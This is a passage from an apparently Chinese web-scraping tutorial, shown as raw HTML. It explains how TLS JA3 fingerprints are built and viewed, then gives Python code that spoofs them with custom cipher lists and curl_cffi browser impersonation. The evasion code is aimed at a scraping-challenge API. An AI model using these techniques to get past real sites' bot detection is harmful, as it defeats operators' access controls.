class="hljs-attribute">urllib3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br><br>固定，所以后端API可以禁止此指纹。<br></code></pre></td></tr></table></figure></li><li><p>浏览器请求</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4865<span class="hljs-string">-4866</span><span class="hljs-string">-4867</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-49171</span><span class="hljs-string">-49172</span><span class="hljs-string">-156</span><span class="hljs-string">-157</span><span class="hljs-string">-47</span><span class="hljs-string">-53</span>,11<span class="hljs-string">-18</span><span class="hljs-string">-27</span><span class="hljs-string">-35</span><span class="hljs-string">-16</span><span class="hljs-string">-51</span><span class="hljs-string">-10</span><span class="hljs-string">-23</span><span class="hljs-string">-5</span><span class="hljs-string">-43</span><span class="hljs-string">-65281</span><span class="hljs-string">-65037</span><span class="hljs-string">-0</span><span class="hljs-string">-17513</span><span class="hljs-string">-13</span><span class="hljs-string">-45</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-24</span>,0]<br><br>[JA3: 5ae2fe79293ec63d585f3f987cf69d01]<br><br>谷歌浏览器的JA3会变化。<br></code></pre></td></tr></table></figure></li></ul><p>扩展：有些网站专门收录ja3黑名单。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/ja3-fingerprints/</span><br>https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/blacklist/</span>sslblacklist.csv<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/salesforce/</span>ja3<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/lists/</span>osx-nix-ja3.csv<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllUasJson<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllHashesJson<br><br></code></pre></td></tr></table></figure><h2 id="2-1-查看指纹"><a href="#2-1-查看指纹" class="headerlink" title="2.1 查看指纹"></a>2.1 查看指纹</h2><p>想要快速查看自己的TSL指纹信息：<a href="https://tls.browserleaks.com/json">https://tls.browserleaks.com/json</a></p><p><img src="/./../blog_image/image-20231102160720074.png" alt="image-20231102160720074"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<span class="hljs-string">&#x27;https://tls.browserleaks.com/json&#x27;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102160648459.png" alt="image-20231102160648459"></p><p>其他网站还有：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.browserleaks.com/json</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/api/all</span><br></code></pre></td></tr></table></figure><h2 id="2-2-Wireshark"><a href="#2-2-Wireshark" class="headerlink" title="2.2 Wireshark"></a>2.2 Wireshark</h2><p>基于Wireshark抓包并筛选出Client Hello数据包，去内部查看：</p><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h3><p>下载并安装Wireshark  <a href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a></p><p><img src="/./../blog_image/image-20231102162717583.png" alt="image-20231102162717583"></p><h3 id="2-抓网卡"><a href="#2-抓网卡" class="headerlink" title="2.抓网卡"></a>2.抓网卡</h3><p>打开Wireshark，选择要抓包监测的网卡，选择你上网使用的那个网卡。</p><p><img src="/./../blog_image/image-20231102162114984.png" alt="image-20231102162114984"></p><h3 id="3-筛选IP"><a href="#3-筛选IP" class="headerlink" title="3.筛选IP"></a>3.筛选IP</h3><p>筛选目标IP <code>ip.dst_host==146.56.195.149</code></p><p><img src="/./../blog_image/image-20231102162435891.png" alt="image-20231102162435891"></p><p><img src="/./../blog_image/image-20231102162148914.png" alt="image-20231102162148914"></p><h3 id="4-数据包"><a href="#4-数据包" class="headerlink" title="4.数据包"></a>4.数据包</h3><p>用浏览器或用requests发送请求，就可以监测到网络请求，然后找到 <code>Client Hello</code>数据包，就可以看到相关指纹信息。</p><p><img src="/./../blog_image/image-20231102154253441.png" alt="image-20231102154253441"></p><h2 id="2-3-ja3"><a href="#2-3-ja3" class="headerlink" title="2.3 ja3"></a>2.3 ja3</h2><p><img src="/./../blog_image/image-20231102165413527.png" alt="image-20231102165413527"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br></code></pre></td></tr></table></figure><p>关于加密相关的值：</p><ul><li><p><code>JA3</code> 是对 <code>JA3 Fullstring</code>进行md5加密的结果。</p></li><li><p><code>JA3 Fullstring</code>是由五段组成</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">JA3 gathers <span class="hljs-keyword">the</span> decimal values <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> following fields <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Client Hello packet; <br>- SSL Version,<br>- Accepted Ciphers<br>- List <span class="hljs-keyword">of</span> Extensions<br>- Elliptic Curves<br>- Elliptic Curve Formats<br>It <span class="hljs-keyword">then</span> concatenates those values together <span class="hljs-keyword">in</span> order, <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> field <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> <span class="hljs-built_in">value</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">each</span> field.<br><br>JA3 为客户端发送的clienthello 数据包中的以下字段收集字节的十进制值: SSL Version, Accepted Ciphers, List <span class="hljs-keyword">of</span> Extensions, Elliptic Curves, <span class="hljs-keyword">and</span> Elliptic Curve Formats(SSL 版本、接受的密码、扩展列表、椭圆曲线和椭圆曲线格式)。然后它将这些值按顺序连接在一起，使用“，”分隔每个字段，使用“-”分隔每个字段中的每个值。<br><br><span class="hljs-keyword">https</span>://github.com/salesforce/ja3<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">SSLVersion,</span> Cipher, SSLExtension, EllipticCurve, EllipticCurvePointFormat<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">第1个值：771                                   表示SSL版本，即：TLS 1.2（0x0303），0x0303转换为10进制就是771<br><br>第2个值：4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>        表示TLS客户端支持的加密套件。<br><br>第三个值：0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>    表示支持的 TLS 扩展<br><br>第四个值：29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>                        表示支持的支持的椭圆曲线（ECC加密算法）<br><br>第五个值：0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>                                 表示支持的椭圆曲线格式<br></code></pre></td></tr></table></figure></li></ul><h3 id="1-SSLVersion"><a href="#1-SSLVersion" class="headerlink" title="1.SSLVersion"></a>1.SSLVersion</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">771<br></code></pre></td></tr></table></figure><p>将0x0303转换为10进制就是771</p><p><img src="/./../blog_image/image-20231102171445727.png" alt="image-20231102171445727"></p><h3 id="2-Cipher"><a href="#2-Cipher" class="headerlink" title="2.Cipher"></a>2.Cipher</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4866</span>-<span class="hljs-number">4867</span>-<span class="hljs-number">4865</span>-<span class="hljs-number">49196</span>-<span class="hljs-number">49200</span>-<span class="hljs-number">159</span>-<span class="hljs-number">52393</span>-<span class="hljs-number">52392</span>-<span class="hljs-number">52394</span>-<span class="hljs-number">49195</span>-<span class="hljs-number">49199</span>-<span class="hljs-number">158</span>-<span class="hljs-number">49188</span>-<span class="hljs-number">49192</span>-<span class="hljs-number">107</span>-<span class="hljs-number">49187</span>-<span class="hljs-number">49191</span>-<span class="hljs-number">103</span>-<span class="hljs-number">49162</span>-<span class="hljs-number">49172</span>-<span class="hljs-number">57</span>-<span class="hljs-number">49161</span>-<span class="hljs-number">49171</span>-<span class="hljs-number">51</span>-<span class="hljs-number">157</span>-<span class="hljs-number">156</span>-<span class="hljs-number">61</span>-<span class="hljs-number">60</span>-<span class="hljs-number">53</span>-<span class="hljs-number">47</span>-<span class="hljs-number">255</span><br></code></pre></td></tr></table></figure><p>将算法套件的十六进制表示，转换成十进制，然后再凭借起来。</p><p><img src="/./../blog_image/image-20231102171555206.png" alt="image-20231102171555206"></p><h3 id="3-SSLExtension"><a href="#3-SSLExtension" class="headerlink" title="3.SSLExtension"></a>3.SSLExtension</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">11</span>-<span class="hljs-number">10</span>-<span class="hljs-number">16</span>-<span class="hljs-number">22</span>-<span class="hljs-number">23</span>-<span class="hljs-number">49</span>-<span class="hljs-number">13</span>-<span class="hljs-number">43</span>-<span class="hljs-number">45</span>-<span class="hljs-number">51</span>-<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>SSL中所有的扩展对应的数字</p><p><img src="/./../blog_image/image-20231102174433762.png" alt="image-20231102174433762"></p><h3 id="4-EllipticCurve"><a href="#4-EllipticCurve" class="headerlink" title="4.EllipticCurve"></a>4.EllipticCurve</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">29</span>-<span class="hljs-number">23</span>-<span class="hljs-number">30</span>-<span class="hljs-number">25</span>-<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>将supported_groups对应的十六进制转换成十进制。</p><p><img src="/./../blog_image/image-20231102173836479.png" alt="image-20231102173836479"></p><h3 id="5-EllipticCurvePointFormat"><a href="#5-EllipticCurvePointFormat" class="headerlink" title="5.EllipticCurvePointFormat"></a>5.EllipticCurvePointFormat</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">1</span>-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>将<code>ec_point_formats</code>转换转换十进制。</p><p><img src="/./../blog_image/image-20231102174113014.png" alt="image-20231102174113014"></p><h1 id="3-突破指纹"><a href="#3-突破指纹" class="headerlink" title="3.突破指纹"></a>3.突破指纹</h1><p>理解TLS中ja3生成机制后，绕过的思路也就有了：<strong>requests请求时，改变 <code>ja3 string</code>得内容，生成合法的的<code>ja3</code>指纹</strong>。</p><h2 id="3-1-【PY】requests【案例3】"><a href="#3-1-【PY】requests【案例3】" class="headerlink" title="3.1 【PY】requests【案例3】"></a>3.1 【PY】requests【案例3】</h2><p>requests在发送请求时，内部依赖urllib3实现。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">15</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">16</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102182216117.png" alt="image-20231102182216117"></p><p>自定义 <code>ciphers</code>实现生成非默认<code>ja3</code></p><p>方式1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>方式2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><span class="hljs-keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="hljs-keyword">import</span> create_urllib3_context<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MineAdapter</span>(<span class="hljs-title class_ inherited__">HTTPAdapter</span>):<br>    CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join(<br>        [<br>            <span class="hljs-string">&quot;ECDHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>            <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!MD5&quot;</span>,<br>            <span class="hljs-string">&quot;!DSS&quot;</span>,<br>        ]<br>    )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_poolmanager</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().init_poolmanager(*args, **kwargs)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_manager_for</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().proxy_manager_for(*args, **kwargs)<br><br><br>session = requests.Session()<br>session.headers.update(&#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>&#125;)<br>session.mount(<span class="hljs-string">&quot;https://&quot;</span>, MineAdapter())<br><br>res = session.get(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>用此方法，可以过案例3的TLS校验机制，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>注意：Python层得TLS是基于底层openssl对外提供的方法，而openssl暴漏给Python只能通过修改 <code>ciphers</code> 来修改ja3指纹，无法支持修改 <code>SSLExtension, EllipticCurve, EllipticCurvePointFormat</code>。</p><h2 id="3-2-【PY】curl-cffi【案例1-2-3】"><a href="#3-2-【PY】curl-cffi【案例1-2-3】" class="headerlink" title="3.2 【PY】curl_cffi【案例1+2+3】"></a>3.2 【PY】curl_cffi【案例1+2+3】</h2><p><a href="https://pypi.org/project/curl-cffi/#description">https://pypi.org/project/curl-cffi/#description</a></p><ul><li>curl是一个可以发送网络请求的工具。</li><li>curl-impersonate是一个基于curl基础上进行开发的一个工具，可以完美的模拟主流的浏览器。</li><li>curl_cffi，是套壳curl-impersonate，让此工具可以更方便的应用在Python中。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> curl-cffi<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> curl_cffi <span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    <span class="hljs-comment"># url=&quot;https://ascii2d.net/&quot;,</span><br>    <span class="hljs-comment"># url=&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;,</span><br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;,<br>    impersonate=<span class="hljs-string">&quot;chrome101&quot;</span>,<br>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="3-3-【Go】CycleTLS-【案例1-2-3】"><a href="#3-3-【Go】CycleTLS-【案例1-2-3】" class="headerlink" title="3.3 【Go】CycleTLS 【案例1+2+3】"></a>3.3 【Go】CycleTLS 【案例1+2+3】</h2><p>关于Golang环境和基础入门教程可以参考：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">课件：https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>xclass.cn<span class="hljs-regexp">/wiki/</span>detail<span class="hljs-regexp">/4/</span><span class="hljs-number">0</span>/<br>视频：https:<span class="hljs-regexp">//</span>www.bilibili.com<span 